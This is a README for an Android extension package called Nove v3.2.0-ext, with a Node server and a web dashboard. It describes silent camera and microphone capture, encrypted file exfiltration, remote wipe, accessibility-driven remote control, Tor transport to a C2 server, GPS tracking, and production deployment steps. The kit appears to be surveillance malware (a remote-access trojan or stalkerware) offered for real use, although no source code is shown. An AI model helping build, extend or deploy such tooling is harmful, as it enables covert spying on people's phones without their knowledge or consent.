# Nove v3.2.0-ext

Production extensions to the v3.1.0 `Nove-main` stack. The base project
stays untouched — this folder contains additive files (Kotlin / TypeScript /
Node), a `Makefile`, docker-compose, threat model, wiring guide, and a
patch script that drops the new files into `Nove-main/`.

## What's new

### Android (`android/`)
| Module | File | Purpose |
|--------|------|---------|
| `CameraCapture` | `capture/CameraCapture.kt` | Silent JPEG snapshot + short MP4 clip (front/back), no preview |
| `MicRecorder` | `audio/MicRecorder.kt` | M4A mic capture + ambient level probe (dBFS) |
| `FileExfil` | `exfil/FileExfil.kt` | AES-GCM-encrypted, chunked, hash-verified binary upload |
| `PanicWipe` | `panic/PanicWipe.kt` | Remote self-destruct (SOFT / HARD / UNINST) |
| `LiveShell` | `shell/LiveShell.kt` | Accessibility-driven UI automation (TAP, TAP_TEXT, TAP_ID, TYPE, GLOBAL_ACTION, LIST, DUMP, SCREENSHOT, WAIT) |
| `CommandRegistry` | `command/CommandRegistry.kt` | Single dispatcher for all extended commands |
| `TorTransport` | `net/TorTransport.kt` | Optional SOCKS-over-Orbot transport for the C2 |
| `ForegroundServiceTypeConfig` | `net/ForegroundServiceTypeConfig.kt` | Android 14+ foreground service type plumbing (camera, mic, sync) |
| `WorkManagerScheduler` | `work/WorkManagerScheduler.kt` | Doze-safe periodic heartbeat fallback |

### Server (`server/`)
| File | Purpose |
|------|---------|
| `lib/firebase.js` | Single-source Firebase Admin init (lazy proxy) |
| `lib/middleware.js` | `verifyUser`, `sanitizeDeviceId`, `sanitizeUserId` (shared) |
| `routes/extended.js` | `/cmd`, `/result`, `/results`, `/live` (SSE) |
| `routes/files.js` | Binary file reassembly + list/download/delete |
| `mount.js` | Drop-in route mount |
| `index-extended.js` | Full v3.1.0 server + extensions in one file |

### Dashboard (`dashboard/`)
| File | Purpose |
|------|---------|
| `App-extended.tsx` | Auth + extended console (drop-in for `App.tsx`) |
| `console-extended.tsx` | Routing for `/live`, `/files`, `/commands`, `/map`, `/panic` |
| `routes/LivePage.tsx` | SSE live console (command results stream) |
| `routes/FilesPage.tsx` | Gallery of reassembled files (image / video / audio / generic) |
| `routes/CommandPalette.tsx` | UI to issue every extended command |
| `routes/MapPage.tsx` | Leaflet map of GPS points |
| `routes/PanicPage.tsx` | Remote wipe with explicit confirmation |
| `extensions.css` | Styles for the new pages |

### Tooling
| File | Purpose |
|------|---------|
| `Makefile` | `make install / server-dev / dashboard-build / docker-up / test / ...` |
| `tools/apply-patch.sh` | Copy extension files into `Nove-main/` |
| `tools/sign-apk.sh` | Generate keystore + sign release APK |
| `tools/dev-firebase-emulator.sh` | Boot local Firebase RTDB emulator |
| `deploy/Dockerfile.server` | Production image for the Node server |
| `deploy/Dockerfile.dashboard` | Build dashboard bundle, serve with nginx |
| `deploy/nginx.conf` | Reverse-proxy `/api/*` to the server |
| `deploy/docker-compose.yml` | One-shot `docker compose up` |

### Docs
| File | Purpose |
|------|---------|
| `docs/WIRING.md` | Step-by-step integration into `Nove-main` |
| `docs/THREAT-MODEL.md` | Architecture, trust boundaries, data classification, ops runbook |

## Quick start

```bash
# from this folder
make help

# full stack
make install                 # server + dashboard deps
make firebase-emu            # local Firebase RTDB (127.0.0.1:9000)
make server-dev              # server on :3000
make dashboard-dev           # dashboard on :5173

# in another terminal
make android-emu             # build + install + boot
```

## Wiring the new files into Nove-main

```bash
NOVEMAIN=../Nove-main ./tools/apply-patch.sh --force
# then follow docs/WIRING.md
```

## Production deploy

```bash
# build the two images
cp deploy/.env.example deploy/.env
$EDITOR deploy/.env
docker compose -f deploy/docker-compose.yml --env-file deploy/.env up -d --build
docker compose -f deploy/docker-compose.yml logs -f
```

Dashboard lives at `http://<host>:8080`, server at `http://<host>:3000`
(proxied through nginx from the dashboard container). Files written under
`var/files/<deviceId>/<id>__<name>` are persisted in the `var_files`
named volume.

## What it does not break

Every v3.1.0 endpoint continues to work. The new endpoints are additive.
The v3.1.0 dashboard still builds and runs against `index-extended.js`
unchanged (the legacy `App.tsx` keeps using `/api/devices`, `/api/activity`,
etc. — the same paths are mounted at `/api/v2/*` by the server).

## Tests

```bash
make test    # node --check on all server JS files
```

The Android side ships without instrumentation tests by default; the
existing `scripts/emulator-test.sh` boots a fresh emulator, installs
the APK, and asserts a successful pairing handshake within 60 seconds.
